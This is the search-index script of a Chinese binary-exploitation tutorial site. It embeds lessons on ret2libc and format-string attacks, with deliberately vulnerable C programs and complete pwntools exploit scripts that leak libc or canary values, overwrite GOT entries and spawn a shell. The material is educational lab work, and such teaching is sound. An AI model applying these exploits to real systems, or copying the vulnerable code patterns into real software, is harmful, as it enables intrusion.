from pwn import* o = process(\u0026quot;./ret2libc1_64\u0026quot;) pop_rdi = 0x400613 bin_sh = 0x400634 call_system = 0x40056f payload = b'a'*0x18 payload += p64(pop_rdi) + p64(bin_sh) # 设置参数 payload += p64(call_system) o.sendline(payload) o.interactive() ret2libc2 # 第二种情况就是没有 /bin/sh 字符串的情况，这时候就得想办法写入 /bin/sh 字符串到一个固定位置，然后在把其地址给system作为参数。我们既然可以调用system函数，那么我们也可以调用其他函数，比如写入函数，就拿上面那个例子来说，我们可以调用gets函数并给它一个可写段的地址作为参数，然后我们写入该地址 /bin/sh 字符串后再将该地址作为参数传递给system函数即可获取shell
将上面那个例子稍微改一改就行
#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; void hint() { system(\u0026quot;echo hello\u0026quot;); } void run() { char buf[0x10]; gets(buf); } int main() { run(); return 0; } // x32: gcc ret2libc1.c -o ret2libc1_32 -fno-stack-protector -no-pie -fno-pic -m32 // x64: gcc ret2libc1.c -o ret2libc1_64 -fno-stack-protector -no-pie -fno-pic 这里我们只看一下32位的情况，然后我们按照前面将的思路，可以得到栈结构为
然后Exploit就可以写出来了
from pwn import* o = process(\u0026quot;./ret2libc2\u0026quot;) gets_plt = 0x8048300 call_system = 0x8048449 bss_addr = 0x804A020 payload = b'a'*24 payload += p32(gets_plt) payload += p32(call_system) payload += p32(bss_addr) o.sendline(payload) o.sendline(\u0026quot;/bin/sh\u0026quot;) o.interactive() ret2libc3 # 第三种情况就是system和 /bin/sh 字符串都没有。我们其实从动态延迟绑定可以知道只要知道了函数的实际地址就可以跳转过去执行函数。而函数在动态链接库中的相对偏移量是固定的，例如puts函数
上图是puts在动态链接库中的位置，而动态链接库加载到内存是会给其一个加载基地址，这个地址是不固定的，函数的实际地址就等于这个加载基地址+在动态链接库中的相对偏移量。同理可以得到libc的加载基地址等于函数的实际地址-函数在动态链接库中的相对偏移量。当我们执行过一次库函数后，got表中就会保留该函数的实际地址，如果我们可以泄露出其内容即实际地址，再知道函数的相对偏移量我们就可以算出动态链接库的加载基地址。最后找到system和 /bin/sh 字符串在动态链接库中的偏移量就可以计算出其实际地址，再次溢出覆盖函数返回地址为system实际地址和 给其/bin/sh 字符串作为参数，即可获取shell。以一个例题来讲
#include\u0026lt;stdio.h\u0026gt; void run() { char buf[0x10]; puts(\u0026quot;hello\\n\u0026quot;); gets(buf); } int main() { run(); return 0; } // gcc ret2libc3.c -o ret2libc3 -fno-stack-protector -no-pie -fno-pic puts函数它接收一个指针，然后就会打印出指针指向的内容，那如果我们直接覆盖函数返回地址为puts函数并给其参数为got表，那么它就会把got表的内容给打印出来，从而获取到库函数实际地址。同时为了保证可以打印后可以实现二次溢出，所以这里应该使用puts的plt表来覆盖函数返回地址，并给puts函数返回地址为run函数地址，这样puts执行完后就会在一次执行run函数，再一次溢出。第一次溢出的栈结构为
第二次溢出已经计算出了system地址和 /bin/sh 地址就可以直接按照ret2lib1的形式来获取shell了。最终Exploit为
from pwn import* context.log_level = 'debug' o = process(\u0026quot;./ret2libc3\u0026quot;) puts_plt = 0x8048310 run = 0x804843B gets_got = 0x804A00C # leak addr payload = b'a'*28 payload += p32(puts_plt) + p32(run) + p32(gets_got) # 打印gets函数的实际地址 o.recv() o.sendline(payload) gets_addr = u32(o.recv(4)) # 获得gets函数的实际地址，u32是为了将小端序转换为正常的顺序 log.info(\u0026quot;gets addr: \u0026quot;+hex(gets_addr)) gets_offset = 0x5F3F0 # gets函数在链接库中的相对偏移量 libc_base = gets_addr - gets_offset # 计算libc加载基地址 log.info(\u0026quot;libc base: \u0026quot;+hex(libc_base)) system_addr = libc_base + 0x3ADB0 # 计算system实际地址 bin_sh = libc_base + 0x15BB2B # 计算 '/bin/sh' 实际地址 # getshell payload = b'a'*28 payload += p32(system_addr) + p32(0x11111111) + p32(bin_sh) o.sendline(payload) o.interactive() 可以先把第一次sendline后的代码都注释掉，执行一次可以得到如下图所示的数据
接收到的前4个字节就是gets函数实际地址小端序形式，如果你没有在sendline之前将I/O里的接收都清空，即sendline之前没有加recv，可能会有如下的可能
之前没清空的会一次性都出来。最后取消注释看一下脚本的执行
具体的可以自己多调试看看
`}),e.add({id:5,href:"/docs/exploit/formatstring/",title:"FormatString",description:"",content:""}),e.add({id:6,href:"/docs/exploit/formatstring/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/",title:"格式化字符串漏洞",description:`0x01 介绍 # 格式化字符串格式 # 在学习C语言的时候，一般第一个学习的函数就是printf函数。它最常用的用法是通过格式化字符串来格式化输出内容，例如
printf(\u0026quot;%s\u0026quot;, buf); 但是也可以简单的写为
printf(buf); 这样也可以将buf字符串内容打印出来。但是这样做有个很大的风险，printf默认它的第一个参数中如果有格式化控制符则会进行解析，如果你对buf字符串输入了格式化控制符的话，这里就会出错，这个就是格式化字符串漏洞。
当我们往buf里输入格式化控制符的话，它会去找对应的参数进行解析，这里所谓的参数就是给printf的第一个之后的参数。但是我们简写的例子并没有给它第二个参数，它就会按照调用约定，自动认为后一个值为它的参数，然后我们可以利用格式化控制符对其进行操作。
在此之前我们需要详细的学习一下格式化控制符以及修饰符。
常用的格式化控制符有如下几个：
%d：有符号十进制
%u：无符号十进制
%x：十六进制整数
%s: 字符串
%p：指针格式
%n：将前面打印的字节数写入到给定指针指向的地方
#include\u0026lt;stdio.h\u0026gt; int main() { int a = 10; printf(\u0026quot;%d\\n\u0026quot;, a); printf(\u0026quot;%x\\n\u0026quot;, a); printf(\u0026quot;%p\\n\u0026quot;, \u0026amp;a); // 打印的是a的地址 printf(\u0026quot;aaaa%n\\n\u0026quot;, \u0026amp;a); // 写入变量a中 printf(\u0026quot;%d\\n\u0026quot;, a); return 0; } 而修饰符有以下几个常用的：
宽度控制符，控制输出的宽度，形式为 %nd ，即输出n位宽度的字符串，如果不足则补空格右对齐
printf(\u0026quot;%4d\u0026quot;, 10); // 输出 \u0026quot; 10\u0026quot; 标志修饰符，控制输出的格式，常用的有以下几个
#：对于不同进制输出标志性字符
printf(\u0026quot;%#x\u0026quot;, 10); // 输出 \u0026quot;0xa\u0026quot; 0：用0填充输出的宽度不足的部分，只对数字类型有效
printf(\u0026quot;%04d\u0026quot;, 1); // 输出 \u0026quot;0001\u0026quot; -：左对齐输出`,content:`0x01 介绍 # 格式化字符串格式 # 在学习C语言的时候，一般第一个学习的函数就是printf函数。它最常用的用法是通过格式化字符串来格式化输出内容，例如
printf(\u0026quot;%s\u0026quot;, buf); 但是也可以简单的写为
printf(buf); 这样也可以将buf字符串内容打印出来。但是这样做有个很大的风险，printf默认它的第一个参数中如果有格式化控制符则会进行解析，如果你对buf字符串输入了格式化控制符的话，这里就会出错，这个就是格式化字符串漏洞。
当我们往buf里输入格式化控制符的话，它会去找对应的参数进行解析，这里所谓的参数就是给printf的第一个之后的参数。但是我们简写的例子并没有给它第二个参数，它就会按照调用约定，自动认为后一个值为它的参数，然后我们可以利用格式化控制符对其进行操作。
在此之前我们需要详细的学习一下格式化控制符以及修饰符。
常用的格式化控制符有如下几个：
%d：有符号十进制
%u：无符号十进制
%x：十六进制整数
%s: 字符串
%p：指针格式
%n：将前面打印的字节数写入到给定指针指向的地方
#include\u0026lt;stdio.h\u0026gt; int main() { int a = 10; printf(\u0026quot;%d\\n\u0026quot;, a); printf(\u0026quot;%x\\n\u0026quot;, a); printf(\u0026quot;%p\\n\u0026quot;, \u0026amp;a); // 打印的是a的地址 printf(\u0026quot;aaaa%n\\n\u0026quot;, \u0026amp;a); // 写入变量a中 printf(\u0026quot;%d\\n\u0026quot;, a); return 0; } 而修饰符有以下几个常用的：
宽度控制符，控制输出的宽度，形式为 %nd ，即输出n位宽度的字符串，如果不足则补空格右对齐
printf(\u0026quot;%4d\u0026quot;, 10); // 输出 \u0026quot; 10\u0026quot; 标志修饰符，控制输出的格式，常用的有以下几个
#：对于不同进制输出标志性字符
printf(\u0026quot;%#x\u0026quot;, 10); // 输出 \u0026quot;0xa\u0026quot; 0：用0填充输出的宽度不足的部分，只对数字类型有效
printf(\u0026quot;%04d\u0026quot;, 1); // 输出 \u0026quot;0001\u0026quot; -：左对齐输出
printf(\u0026quot;%-2d\u0026quot;, 1); // 输出 \u0026quot;1 \u0026quot; +：输出数值类型时始终显示正负号
printf(\u0026quot;%+d\u0026quot;, 2); // 输出 \u0026quot;+2\u0026quot; 精度修饰符，用来控制浮点数输出的小数位数或者字符串输出的字符个数，例如 %.ns ，输出字符串时保留n个字节
printf(\u0026quot;%.3s\u0026quot;, \u0026quot;hello\u0026quot;); // 输出 \u0026quot;hel\u0026quot; 长度修饰符，控制输出数据的大小，常用的有
hh：一个字节大小
printf(\u0026quot;%hhx\u0026quot;, 0x123456789abcdef0); // 输出 \u0026quot;f0\u0026quot; h：两个字节
printf(\u0026quot;%hx\u0026quot;, 0x123456789abcdef0); // 输出 \u0026quot;def0\u0026quot; l：4个字节
printf(\u0026quot;%lx\u0026quot;, 0x123456789abcdef0); // 输出 \u0026quot;9abcdf0\u0026quot; ll：8个字节
printf(\u0026quot;%llx\u0026quot;, 0x123456789abcdef0); // 输出 \u0026quot;123456789abcdef0\u0026quot; 参数控制符，可以控制访问第几个参数，形式为 %n$d ，可以访问printf第n+1个参数
printf(\u0026quot;%2$d\u0026quot;, 1, 2, 3); // 输出 \u0026quot;2\u0026quot; 格式化字符串漏洞 # 学过了这些基本知识再来看看格式化字符串漏洞的两种表现形式：任意读和任意写。任意读比较好理解，我们一开始的那个例子就是任意读的应用，可以读取栈中的内容，如果我们加上参数控制符，那么就可以任意读取栈中你想要的数据
而栈里面有很多有用数据，比如canary值、栈地址和libc地址，然后我们通过任意读就可以来绕过canary、计算libc基地址等操作。一般用%p来泄露栈中数据比较多，因为它可以将数据以指针的形式打印出来。但是它只能打印栈中的内容，如果要打印指定地方的值，比如bss、got表等地方，你可以用%s来打印，%s会接收一个指针作为参数，然后打印指针指向地方的数据。
我们先尝试泄露栈内容试试，举个例子
#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int main() { setbuf(stdout, 0); // printf是缓存型输出，如果你不设置stdout的缓冲区为0的话，则可能不能及时获取输出 char buf[0x10]; printf(\u0026quot;input: \\n\u0026quot;); scanf(\u0026quot;%16s\u0026quot;, buf); printf(buf); return 0; } // gcc format_leak_x32.c -m32 -o format_leak_x32 这是一个32位的程序，然后加了canary保护，我们可以通过这里的格式化字符串漏洞来尝试泄露canary值，我们把断点设置在格式化字符串漏洞处，来看一下栈的布局
从图中不难看出，canary的位置相当于格式化字符串的第十一个参数，所以我们可以通过 %11$p 将canary值泄露出来
这个泄露出来的值可以看出来很明显的canary特征。我们再将其编译为64位程序来看一下
gcc format_leak_x32.c -o format_leak_x64 64位和32位不同的地方在于64位函数的前6个参数都是通过寄存器来传递的，超过的才会用到栈
所以这里canary对于格式化字符串参数的偏移量为5个参数寄存器+4个栈单元=9，输入 %9$p 即可泄露canary值
再来看看如何泄露其他地方的值，比如泄露got表内容，还是以上面那个32位例子来看，我们这里需要用到got表的地址再加上 %s 即可泄露。首先我们需要通过调试来确定buf距离格式化字符串的偏移量，因为我们的got表地址是存储在buf中的，我们需要通过参数控制符来让 %s 读取该地址的内容。从之前的分析可以看到偏移量为7，所以payload可以这样写
payload = p32(printf_got) + b\u0026quot;%7$s\u0026quot; 任意写则是通过 %n 来实现，该格式控制符也需要一个指针来作为参数，通常该格式化控制符一次性写入的是4个字节，但是我们可以通过长度控制符来控制一次性写入的字节，举个例子
#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int a = 0x12345678; int main() { char buf[0x10]; scanf(\u0026quot;%16s\u0026quot;, buf); printf(buf); printf(\u0026quot;\\na: %x\\n\u0026quot;, a); if(a == 0x12345604) { system(\u0026quot;/bin/sh\u0026quot;); } else { printf(\u0026quot;err\\n\u0026quot;); } return 0; } // gcc format_attack_x32.c -o format_attack_x32 -no-pie -m32 如果不加长度控制符的话，则会覆盖掉a所有的值
from pwn import * # context.log_level = 'debug' o = process(\u0026quot;./format_attack_x32\u0026quot;) elf = ELF(\u0026quot;./format_attack_x32\u0026quot;) a = 0x804a02c payload = p32(a) + b\u0026quot;%7$n\u0026quot; o.sendline(payload) o.interactive() 但是如果我们加上长度控制符，只覆盖一个字节的话，则会不同
from pwn import * # context.log_level = 'debug' o = process(\u0026quot;./format_attack_x32\u0026quot;) elf = ELF(\u0026quot;./format_attack_x32\u0026quot;) a = 0x804a02c payload = p32(a) + b\u0026quot;%7$hhn\u0026quot; o.sendline(payload) o.interactive() 接下来我们尝试通过格式化字符串漏洞任意写got表内容为getshell函数地址，以一个例子来讲
#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; void hint() { system(\u0026quot;/bin/sh\u0026quot;); } int main() { setbuf(stdout, 0); char buf[0x20]; scanf(\u0026quot;%s\u0026quot;, buf); printf(buf); exit(0); } // gcc format_attack.c -o format_attack -m32 -no-pie 32位程序的地址一般都是满4个字节的，但是通过格式化字符串漏洞任意写的话首先要打印很长的字节才行，这样既低效又有可能执行失败。这里就得采用宽度控制符+分段覆盖的方法来完成。我们可以采取每两个字节一覆盖的形式来完成，首先我们来看一下hint函数的地址
0x0804851b，这个数字的后两个字节大小比前两个字节的大小要大，所以我们可先考虑写入exit的got表高两位，再写入它的低两位。首先我们先想想如何写入前两个字节，在payload我们由于要分两段写入的，所以会在最前面放两个地址即exit的got表+2地址和exit的got表地址，这里就有了8个字节，然后还需要再打印0x804-8个字节打印出的字节才可以达到前两个字节的大小，这时候再通过 %hn 写入两个字节到got表+2的位置。接着来想办法写入后两个字节，前面已经打印了0x804个字节的内容了，然后还需要打印0x851b-0x804个字节才能满足后两个字节的大小，这时候再通过 %hn 写入两个字节到got表的位置。所以payload可以写为
payload = p32(exit_got+2) + p32(exit_got) payload += \u0026quot;%{}d%7$hn\u0026quot;.format(0x804-8) payload += \u0026quot;%{}d%8$hn\u0026quot;.format(0x851b-0x804) 前面一大段的空白是宽度控制符打印出来的空格，这时候exit的got表就已经填为了hint函数的地址了。而我们学过call函数的时候会首先跳转到plt表执行，然后plt里第一条指令是跳转去执行对应got表里存储的地址，这里我们已经覆盖为hint后，调用exit函数就会直接跳转去执行hint函数了
`}),e.add({id:7,href:"/docs/exploit/formatstring/%E5%85%A8%E5%B1%80%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99/",title:"全局格式化字符串任意写",description:`0x01 介绍 # 之前的情况是格式化字符串保存在栈中，所以我们可以很容易控制栈的内容，往栈中写入地址等数据，但是如果格式化字符串是保存在bss、data段，那么我们就不能再通过之前的方式来实现任意写。之前任意写能实现就是因为在栈中有我们写入的地址，而现在我们不能对栈写入地址了。
我们来仔细观察栈中的数据
可以发现栈中保存了很多栈地址，如果我们可以通过任意写往这些栈地址指向的地方写入我们要攻击的地址，然后栈中就会出现被攻击的地址，最后我们再往被攻击的地址写入指定数据即可获取shell等操作
我们以一个例子来看
#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; char buf[0x50]; void hint() { system(\u0026quot;/bin/sh\u0026quot;); } int main() { int choice; setbuf(stdout, 0); while(1) { scanf(\u0026quot;%d\u0026quot;, \u0026amp;choice); if(choice == 1) { scanf(\u0026quot;%s\u0026quot;, buf); printf(buf); } else { exit(0); } } } // gcc global_printf.c -m32 -o global_printf_x32 -no-pie 虽然原理按照之前的来将很简单，但是我们不能选简单的栈地址，而应该选栈链形式的地址，我们在之前讲任意写的时候是通过两次写入才完成的，因为我们不可以一次性写入很大的值，所以我们其实是需要中间有个地址过度，这个地址过度的目的是为了可以分两次来写入attack addr。我们可以控制过度地址的末尾的字节来修改stack addr的位置，从而达到分段写的目的。
我们以这个例子来具体讲操作。首先通过 0xffffd654 修改 0xffffd783 的后两个字节为离当前栈顶近的位置，再覆写之前需要先泄露一个地址，然后通过计算相对偏移量来获取设置后两个字节应该覆盖的地址，比如我们可以泄露图中第九个栈单元的 0xffffd5c0 ，而我们要写入的地址为 0xffffd5a8 ，泄露出来的地址和我们要写入地址之间的偏移量为0x18，payload就可以写为
stack = leak_addr - 0x18 # leak_addr为泄露出来的栈地址 payload = (\u0026quot;%{0}d%5$hn\u0026quot;.format(stack \u0026amp; 0xffff)).`,content:`0x01 介绍 # 之前的情况是格式化字符串保存在栈中，所以我们可以很容易控制栈的内容，往栈中写入地址等数据，但是如果格式化字符串是保存在bss、data段，那么我们就不能再通过之前的方式来实现任意写。之前任意写能实现就是因为在栈中有我们写入的地址，而现在我们不能对栈写入地址了。
我们来仔细观察栈中的数据
可以发现栈中保存了很多栈地址，如果我们可以通过任意写往这些栈地址指向的地方写入我们要攻击的地址，然后栈中就会出现被攻击的地址，最后我们再往被攻击的地址写入指定数据即可获取shell等操作
我们以一个例子来看
#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; char buf[0x50]; void hint() { system(\u0026quot;/bin/sh\u0026quot;); } int main() { int choice; setbuf(stdout, 0); while(1) { scanf(\u0026quot;%d\u0026quot;, \u0026amp;choice); if(choice == 1) { scanf(\u0026quot;%s\u0026quot;, buf); printf(buf); } else { exit(0); } } } // gcc global_printf.c -m32 -o global_printf_x32 -no-pie 虽然原理按照之前的来将很简单，但是我们不能选简单的栈地址，而应该选栈链形式的地址，我们在之前讲任意写的时候是通过两次写入才完成的，因为我们不可以一次性写入很大的值，所以我们其实是需要中间有个地址过度，这个地址过度的目的是为了可以分两次来写入attack addr。我们可以控制过度地址的末尾的字节来修改stack addr的位置，从而达到分段写的目的。
我们以这个例子来具体讲操作。首先通过 0xffffd654 修改 0xffffd783 的后两个字节为离当前栈顶近的位置，再覆写之前需要先泄露一个地址，然后通过计算相对偏移量来获取设置后两个字节应该覆盖的地址，比如我们可以泄露图中第九个栈单元的 0xffffd5c0 ，而我们要写入的地址为 0xffffd5a8 ，泄露出来的地址和我们要写入地址之间的偏移量为0x18，payload就可以写为
stack = leak_addr - 0x18 # leak_addr为泄露出来的栈地址 payload = (\u0026quot;%{0}d%5$hn\u0026quot;.format(stack \u0026amp; 0xffff)).encode() 可以发现已经修改成功，接着我们注入exit的got表的低2位， 0xffa792b4 的偏移量为53
payload = (\u0026quot;%{0}d%53$hn\u0026quot;.format(exit_got \u0026amp; 0xffff)).encode() 低字节已经覆盖成功了，接下来修改stack2 addr为stack2 addr+2
payload = (\u0026quot;%{0}d%5$hn\u0026quot;.format((stack \u0026amp; 0xffff) + 2)).encode() 最后再次注入exit的got高地址
payload = (\u0026quot;%{0}d%53$hn\u0026quot;.format((exit_got \u0026gt;\u0026gt; 16) \u0026amp; 0xffff)).encode() 这时候完整的exit的got表就写入成功了，而hint地址为
和exit的got表内存储的地址 0x80483e6 只有后两个字节不一样，所以只要覆盖低两位几个，这里偏移量为10
payload = (\u0026quot;%{0}d%10$hn\u0026quot;.format(hint \u0026amp; 0xffff)).encode() 最后就修改成功了，只要退出触发exit函数即可获取shell
完整的Exploit为
from pwn import* o = process(\u0026quot;./global_printf_x32\u0026quot;) elf = ELF(\u0026quot;./global_printf_x32\u0026quot;) exit_got = elf.got['exit'] hint = elf.sym['hint'] o.sendline(b\u0026quot;1\u0026quot;) o.sendline(b\u0026quot;%9$p\u0026quot;) leak_addr = int(o.recv(), 16) log.info(hex(leak_addr)) stack = leak_addr - 0x18 o.sendline(b\u0026quot;1\u0026quot;) payload = (\u0026quot;%{0}d%5$hn\u0026quot;.format(stack \u0026amp; 0xffff)).encode() o.sendline(payload) o.sendline(b\u0026quot;1\u0026quot;) payload = (\u0026quot;%{0}d%53$hn\u0026quot;.format(exit_got \u0026amp; 0xffff)).encode() o.sendline(payload) o.sendline(b\u0026quot;1\u0026quot;) payload = (\u0026quot;%{0}d%5$hn\u0026quot;.format((stack \u0026amp; 0xffff) + 2)).encode() o.sendline(payload) o.sendline(b\u0026quot;1\u0026quot;) payload = (\u0026quot;%{0}d%53$hn\u0026quot;.format((exit_got \u0026gt;\u0026gt; 16) \u0026amp; 0xffff)).encode() o.sendline(payload) o.sendline(b\u0026quot;1\u0026quot;) payload = (\u0026quot;%{0}d%10$hn\u0026quot;.format(hint \u0026amp; 0xffff)).encode() o.sendline(payload) o.interactive() 其他的同理，我们还可以通过这种方法来覆盖函数返回地址等东西
`}),e.add({id:8,href:"/docs/exploit/",title:"Exploit",description:"",content:""}),e.add({id:9,href:"/docs/",title:"Docs",description:"learn docs",content:""}),search.addEventListener("input",t,!0);function t(){const s=5;var n=this.value,o=e.search(n,{limit:s,enrich:!0});const t=new Map;for(const e of o.flatMap(e=>e.result)){if(t.has(e.doc.href))continue;t.set(e.doc.href,e.doc)}if(suggestions.innerHTML="",suggestions.classList.remove("d-none"),t.size===0&&n){const e=document.createElement("div");e.innerHTML=`No results for "<strong>${n}</strong>"`,e.classList.add("suggestion__no-results"),suggestions.appendChild(e);return}for(const[r,a]of t){const n=document.createElement("div");suggestions.appendChild(n);const e=document.createElement("a");e.href=r,n.appendChild(e);const o=document.createElement("span");o.textContent=a.title,o.classList.add("suggestion__title"),e.appendChild(o);const i=document.createElement("span");if(i.textContent=a.description,i.classList.add("suggestion__description"),e.appendChild(i),suggestions.appendChild(n),suggestions.childElementCount==s)break}}})()